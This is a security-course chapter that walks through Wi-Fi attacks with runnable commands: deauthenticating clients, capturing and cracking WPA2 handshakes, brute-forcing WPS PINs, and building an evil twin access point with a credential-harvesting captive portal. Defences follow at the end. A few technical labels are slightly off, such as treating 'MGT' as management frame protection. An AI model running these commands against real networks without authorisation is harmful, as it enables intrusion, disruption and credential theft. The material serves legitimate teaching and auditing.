---
title: "Wireless Security"
subtitle: "WPA2 handshake capture, WPS attacks, evil twin APs, deauthentication, and wireless network defense."
chapter: 12
level: "intermediate"
readingTime: "10 min"
topics: ["wireless", "WPA2", "WPS", "evil twin", "aircrack", "handshake capture", "deauthentication", "WiFi hacking"]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

WiFi security is the lock on your front door — most people set it up once and forget it. WPA2 with a strong password is fine; WPA2 with "password123" is a screen door on a submarine.

</Callout>

## Wireless Attack Prerequisites

```bash
# Need a WiFi adapter that supports monitor mode and packet injection
# Recommended: Alfa AWUS036ACH (USB)
# Built-in laptop WiFi usually does NOT support injection

# Check your adapter
iw list | grep "Supported interface modes" -A 10

# Put adapter into monitor mode
sudo airmon-ng check kill      # kill processes that interfere
sudo airmon-ng start wlan0     # creates wlan0mon

# Verify monitor mode
iwconfig wlan0mon   # Mode: Monitor
```

## Network Discovery

```bash
# Scan for nearby networks
sudo airodump-ng wlan0mon

# Output columns:
# BSSID  = AP MAC address
# PWR    = signal strength (higher/less negative = closer)
# Beacons= number of beacon frames
# Data   = data frames (higher = active network)
# CH     = channel
# ENC    = encryption type (WPA2, WEP, OPN)
# CIPHER = CCMP (WPA2), TKIP (WPA/TKIP)
# AUTH   = PSK (pre-shared key), MGT (Enterprise/802.1X)
# ESSID  = network name

# Focus on a specific network + channel
sudo airodump-ng --bssid TARGET_BSSID --channel 6 --write capture wlan0mon
```

## WPA2 Handshake Capture

WPA2 uses a 4-way handshake during authentication. Capturing it lets you crack it offline.

```bash
# Start capturing on target network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write handshake wlan0mon

# Wait for a client to connect (patience) OR force a reconnect:
# Open a second terminal — send deauth to force client to reconnect
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -a = AP BSSID
# -c = client to deauthenticate (omit for broadcast deauth — noisier)
# --deauth 10 = send 10 deauth frames

# Watch airodump-ng output — wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right corner

# You now have: handshake-01.cap
```

## Cracking WPA2 with Aircrack-ng

```bash
# Dictionary attack
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt

# With ESSID (required if not detected automatically)
aircrack-ng handshake-01.cap -e "NetworkName" -w /usr/share/wordlists/rockyou.txt
```

## Cracking with Hashcat (Faster — GPU)

```bash
# Convert .cap to hashcat format
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With rules for more coverage
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (use for short passwords)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8-digit PIN
hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l  # 8-char lowercase
```

## WPS Attacks

WPS (WiFi Protected Setup) has a design flaw: the 8-digit PIN is validated in two halves, reducing guessing from 10^8 to 10^4 + 10^3 = 11,000 attempts.

```bash
# Check if WPS is enabled
sudo wash -i wlan0mon
# Shows: BSSID, Channel, ESSID, WPS Locked (Yes/No)

# Reaver — WPS brute force
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
# -b = BSSID
# -c = channel
# -vv = verbose

# Takes 4-8 hours on average. Some APs lock after too many attempts.

# Pixie Dust attack (faster — works against some APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv
# -K 1 = Pixie Dust attack
# If vulnerable: cracks in seconds to minutes
```

## Evil Twin Attack

Create a fake AP with the same name as the target — capture credentials from clients that connect:

```bash
# Method 1: hostapd-wpe (WPA Enterprise evil twin)
sudo apt install hostapd-wpe

# Method 2: airbase-ng (open AP)
sudo airbase-ng -e "TargetNetworkName" -c 6 wlan0mon

# Method 3: WiFi-Pumpkin / Wifiphisher (automated)
sudo wifiphisher --essid "TargetNetworkName" --channel 6

# Method 4: Manual with hostapd + dnsmasq + captive portal
# hostapd.conf:
interface=wlan0
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=1
wpa=0   # open network (no password — clients connect easier)

# dnsmasq.conf:
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1      # gateway
dhcp-option=6,10.0.0.1      # DNS
address=/#/10.0.0.1          # all DNS → attacker (captive portal)

# Captive portal page captures credentials entered by victims
```

## WPA3 and Modern Defenses

```
WPA2 weaknesses:
- 4-way handshake can be captured and cracked offline
- PMKID attack (newer) — no client needed, just capture beacon
- Dictionary attacks effective against weak passwords

WPA3 improvements:
- SAE (Simultaneous Authentication of Equals) replaces PSK
- Forward secrecy — even if password is cracked later, past sessions are safe
- No offline dictionary attacks (the server is needed for each guess)
- Dragonfly handshake — resistant to offline cracking

Attack against WPA3:
- Downgrade to WPA2 using evil twin
- Implementation bugs (Dragonblood CVEs — 2019)
- Still vulnerable to social engineering
```

## Wireless Audit Checklist

```bash
# 1. Discover networks
sudo airodump-ng wlan0mon

# 2. Note encryption type (WEP = critical, WPA2 TKIP = weak, WPA2 CCMP = OK)
# 3. Check WPS status for each AP
sudo wash -i wlan0mon

# 4. Attempt WPS Pixie Dust on enabled APs
sudo reaver -i wlan0mon -b BSSID -c CH -K 1 -vv

# 5. Capture WPA2 handshakes
# 6. Dictionary attack with good wordlist

# 7. Check for management frame protection
sudo airodump-ng wlan0mon | grep "MGT"
# MGT = WPA Enterprise (802.1X) — much harder to attack

# 8. Check for rogue APs (same SSID, different BSSID)
sudo airodump-ng wlan0mon | grep "TargetSSID"
# Multiple BSSIDs with same ESSID = possible evil twin attack in progress
```

## Defense Recommendations

```
Network side:
- WPA2-AES (CCMP) minimum, WPA3 preferred
- Disable WPS — no exceptions
- Strong, random passphrase (12+ chars, mixed)
- Enterprise 802.1X with certificates (not just username/password)
- Wireless IDS: detect deauth floods, rogue APs
- SSID shouldn't reveal company name or AP model

Client side:
- Never auto-connect to open networks
- Verify SSID + BSSID before connecting
- Use a VPN on all WiFi (assume network is untrusted)
- HTTPS-only: TLS ensures confidentiality even on evil twin
```

